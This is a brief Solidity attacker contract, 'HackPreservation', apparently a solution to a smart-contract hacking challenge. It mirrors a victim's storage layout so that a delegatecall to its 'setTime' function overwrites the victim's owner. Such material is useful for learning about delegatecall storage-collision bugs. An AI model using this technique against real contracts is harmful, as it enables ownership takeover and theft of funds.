pragma solidity ^0.5;

contract HackPreservation {
    uint256 slot0 = uint256(1);
    uint256 slot1 = uint256(1);
    address owner;

    function setTime(uint256 _owner) public {
        owner = address(_owner);
    }
}
